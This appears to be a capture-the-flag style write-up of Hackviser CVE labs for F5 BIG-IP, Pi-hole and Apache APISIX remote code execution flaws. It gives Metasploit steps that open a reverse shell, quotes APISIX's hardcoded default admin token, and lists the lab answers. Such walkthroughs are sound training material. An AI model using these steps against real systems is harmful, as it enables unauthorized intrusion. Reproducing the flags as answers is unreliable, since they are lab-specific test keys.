---
title: 'CVE 2020'
date: '2026-05-04'
excerpt: 'CVE-2020-5902, CVE-2020-8816, CVE-2020-13945'
prog: 'Hackviser CVE Labs  -  May 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_hackviser_logo.webp" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2020</h1>
<div class="writeup-date">May 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h4 class="mb-2">1. F5 BIG-IP TMUI Remote Code Execution (CVE-2020-5902)</h4>
<p class="mb-3">F5 BIG-IP is a popular application delivery controller (ADC) and security appliance. In vulnerable versions (11.6.1-11.6.5, 12.1.0-12.1.5, 13.1.0-13.1.3, 14.1.0-14.1.2, and 15.0.0-15.1.0), a highly critical Remote Code Execution vulnerability (CVE-2020-5902) exists in the Traffic Management User Interface (TMUI) component. The vulnerability is caused by a directory traversal flaw in the underlying Tomcat server, allowing unauthenticated attackers to execute arbitrary system commands via the /tmui/locallb/workspace/tmshCmd.jsp endpoint. Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside the file? Note: The server does not use an SSL certificate.</p>
<p class="mb-3"><strong>Steps: </strong></p>
<p class="mb-5"><strong>Answer:</strong> </p>
<br />

<h4 class="mb-2">2. Pi-hole AdminLTE Web Interface Remote Code Execution (CVE-2020-8816)</h4>
<p class="mb-3">Pi-hole is a network-level advertisement and Internet tracker blocking application. In versions of Pi-hole prior to 4.3.3, an authenticated Remote Code Execution (RCE) vulnerability (CVE-2020-8816) exists in the AdminLTE web interface. This vulnerability is caused by the improper sanitization of the MAC address field in the DHCP settings, which allows an attacker to directly execute injected shell commands on the server. Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2020-8816</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2020/cve-2020-8816/cvelabs_cve-2020-8816_image1.png" alt="CVE-2020-8816 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Command shell session will open and we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2020/cve-2020-8816/cvelabs_cve-2020-8816_image2.png" alt="CVE-2020-8816 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Neptune</p>
<br />

<h4 class="mb-2">3. Apache APISIX Default Admin API Token Remote Code Execution (CVE-2020-13945)</h4>
<p class="mb-3">Apache APISIX is a dynamic, real-time, high-performance Cloud-Native API Gateway used for managing, routing, and securing API traffic in microservices architectures. This laboratory environment focuses on CVE-2020-13945, a critical vulnerability identified in Apache APISIX. The root cause is a hardcoded default access token (edd1c9f034335f136f87ad84b625c8f1) in the Admin API configuration. Although later versions attempt to mitigate this by restricting access to localhost, this lab also involves CVE-2022-24112 to bypass that IP-based restriction, allowing for remote exploitation. While the initial vulnerability in versions 1.2 through 1.5 granted administrative control, its severity dramatically increased in later 2.x versions. With the introduction of the script parameter, an attacker with administrative access could now inject arbitrary Lua code directly into a route's configuration. When this route is accessed, the injected script executes on the server, leading to Remote Code Execution (RCE). What is the secret in the /secret.txt file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2020-13945</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2020/cve-2020-13945/cvelabs_cve-2020-13945_image1.png" alt="CVE-2020-13945 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Command shell session will open and we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2020/cve-2020-13945/cvelabs_cve-2020-13945_image2.png" alt="CVE-2020-13945 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Allosaurus</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>